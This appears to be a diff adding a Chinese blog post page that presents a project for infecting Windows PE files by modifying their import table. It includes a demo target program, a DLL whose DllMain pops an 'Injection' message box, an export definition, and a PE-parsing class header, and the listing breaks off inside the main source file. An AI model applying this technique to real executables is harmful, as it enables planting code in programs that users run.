@@ -1,0 +1,776 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/project/img/cutegirl.png">
+  <link rel="icon" href="/project/img/cutegirl.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Sivan Zhang">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="修改PE文件导入表实现PE文件感染">
+<meta property="og:type" content="article">
+<meta property="og:title" content="InfectImportTable">
+<meta property="og:url" content="https://wlpswmt.github.io/project/2023/02/03/InfectImportTable/index.html">
+<meta property="og:site_name" content="Silence">
+<meta property="og:description" content="修改PE文件导入表实现PE文件感染">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-02-03T14:41:25.000Z">
+<meta property="article:modified_time" content="2023-03-01T15:11:57.400Z">
+<meta property="article:author" content="Sivan Zhang">
+<meta property="article:tag" content="感染">
+<meta property="article:tag" content="PE">
+<meta property="article:tag" content="导入">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>InfectImportTable - Silence</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/project/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/project/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/project/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"wlpswmt.github.io","root":"/project/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/project/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/project/js/utils.js" ></script>
+  <script  src="/project/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+<link href="https://cdn.bootcss.com/KaTeX/0.7.1/katex.min.css" rel="stylesheet">
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/project/">
+      <strong>幽客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/project/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/project/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/project/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/project/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/project/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/project/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="InfectImportTable"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Sivan Zhang
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-02-03 22:41" pubdate>
+          2023年2月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          24k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          307 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">InfectImportTable</h1>
+            
+              <p class="note note-primary">
+                
+                  
+                    本文最后更新于：1 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>修改PE文件导入表实现PE文件感染</p>
+<span id="more"></span>
+
+<p>三个项目<br>1.Demo 生成被感染的PE文件<br>2.Dll<br>3.InfectImportTable </p>
+<p>1.Demo<br> 1)Demo.cpp<br>// Demo.cpp : 此文件包含 “main” 函数。程序执行将在此处开始并结束。<br>//</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProcedure</span><span class="hljs-params">(LPVOID ParameterData)</span></span>;<br><span class="hljs-type">int</span> _tmain()<br>&#123;<br>	<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProcedure, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">while</span> (TRUE)<br>	&#123;<br>		<span class="hljs-built_in">Sleep</span>(<span class="hljs-number">20000</span>);<br>	&#125;<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProcedure</span><span class="hljs-params">(LPVOID ParameterData)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">while</span> (TRUE)<br>	&#123;<br>		<span class="hljs-built_in">SleepEx</span>(<span class="hljs-number">3000</span>, TRUE);<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>2.Dll<br>1)Dll.cpp</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function">VOID <span class="hljs-title">HelloWorld</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProcedure</span><span class="hljs-params">(LPVOID ParameterData)</span></span>;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HANDLE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">	DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">	LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span> (ul_reason_for_call == DLL_PROCESS_ATTACH)<br>	&#123;<br>		<span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, ThreadProcedure, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>	&#125;<br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">ThreadProcedure</span><span class="hljs-params">(LPVOID ParameterData)</span></span><br><span class="hljs-function"></span>&#123;<br>	TCHAR v1[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>	TCHAR BufferData[<span class="hljs-number">1024</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br><br><br>	<span class="hljs-built_in">MessageBox</span>(<span class="hljs-literal">NULL</span>, _T(<span class="hljs-string">&quot;Injection&quot;</span>), _T(<span class="hljs-string">&quot;Injection&quot;</span>), MB_OK);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//导出函数</span><br><span class="hljs-function">VOID <span class="hljs-title">HelloWorld</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>2)Source.def</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">LIBRARY      <span class="hljs-string">&quot;Dll&quot;</span><br>DESCRIPTION  <span class="hljs-string">&#x27;Dll&#x27;</span><br>EXPORTS<br>	HelloWorld				@<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>3.InfectImportTable<br>1)CPEImage.h</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> once</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;tchar.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_LENGTH (0x1000)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALIGN_SIZE_UP(Size,Alignment)  (((ULONG_PTR)(Size) + Alignment - 1) &amp; ~(Alignment - 1)) <span class="hljs-comment">//对齐粒度</span></span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">_CPEImage</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>	_CPEImage();<br>	~_CPEImage();<br>	HANDLE m_FileHandle;<br>	DWORD m_dwPageSize;<br>	HANDLE m_hProc;<br>	WORD m_NumberOfSections;<br><br>	PBYTE m_ModuleHandle;<br>	PIMAGE_DOS_HEADER m_ImageDosHeader;<br>	PIMAGE_NT_HEADERS m_ImageNtHeaders;<br>	PIMAGE_FILE_HEADER m_ImageFileHeader;<br>	PIMAGE_OPTIONAL_HEADER m_ImageOptionalHeader;<br>	PIMAGE_DATA_DIRECTORY m_RelocateDataTable;<br>	PIMAGE_SECTION_HEADER m_ImageSectionHeader;<br>	PIMAGE_DATA_DIRECTORY m_ImportDataTable;<br>	PIMAGE_DATA_DIRECTORY m_ExportDataTable;<br>	PIMAGE_EXPORT_DIRECTORY m_ImageExportDirectory;<br>	PIMAGE_IMPORT_DESCRIPTOR m_ImageImportDescriptor;<br>	<br>	IMAGE_DATA_DIRECTORY m_OldImportDataTable;   <span class="hljs-comment">//VirtualAddress Size</span><br><br>	ULONG_PTR m_AddressOfEntryPoint;<br>	DWORD m_SizeOfImage;<br>	ULONG_PTR m_ImageBase;<br>	BYTE m_BufferData[BUFFER_LENGTH];<span class="hljs-comment">//保存一份PE头的数据内部使用</span><br><span class="hljs-keyword">public</span>:<br><br>	<span class="hljs-function">PBYTE <span class="hljs-title">LoadImage</span><span class="hljs-params">(HANDLE FileHandle, BOOL IsDoRelocate = TRUE, ULONG_PTR RelocateBase = <span class="hljs-number">0</span>, BOOL IsDoImport = FALSE)</span></span>;<br>	<span class="hljs-function">BOOL  <span class="hljs-title">VerifyImage</span><span class="hljs-params">(PVOID VirtualAddress)</span></span>;<br>	<span class="hljs-function">VOID  <span class="hljs-title">InitializePeHeaders</span><span class="hljs-params">(PBYTE VirtualAddress)</span></span>;<br>	<span class="hljs-function">DWORD <span class="hljs-title">GetAlignedSize</span><span class="hljs-params">(DWORD BufferLength, DWORD Alignment)</span></span>;<br>	<span class="hljs-function">VOID  <span class="hljs-title">ProcessRelocateTable</span><span class="hljs-params">(ULONG_PTR RelocateBase)</span></span>;<br>	<span class="hljs-function">BOOL  <span class="hljs-title">ProcessImportTable</span><span class="hljs-params">()</span></span>;<br>	<span class="hljs-function">BOOL  <span class="hljs-title">SnapThunk</span><span class="hljs-params">(HMODULE ModuleHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">		<span class="hljs-type">char</span> *Name, PBYTE ImageBase, PIMAGE_THUNK_DATA OriginalFirstThunk, PIMAGE_THUNK_DATA FirstThunk)</span></span>;<br>	<span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">LocateSectionByRva</span><span class="hljs-params">(DWORD Rva)</span></span>;<br>	<span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">LocateSectionByFileOffset</span><span class="hljs-params">(DWORD ParameterData)</span></span>;<br>	<span class="hljs-function">DWORD <span class="hljs-title">GetSectionPhysialPaddingSize</span><span class="hljs-params">(PIMAGE_SECTION_HEADER ImageSectionHeader)</span></span>;<br>	<span class="hljs-function">PIMAGE_SECTION_HEADER <span class="hljs-title">AddNewSectionToFile</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *SectionName, DWORD SectionSize)</span></span>;<br>	<span class="hljs-function">DWORD <span class="hljs-title">Raw2Rva</span><span class="hljs-params">(DWORD FileOffset)</span></span>;<br>	<span class="hljs-function">DWORD <span class="hljs-title">Rva2Raw</span><span class="hljs-params">(DWORD Rva)</span></span>;<br>&#125;;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>2)CPEImage.cpp</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span 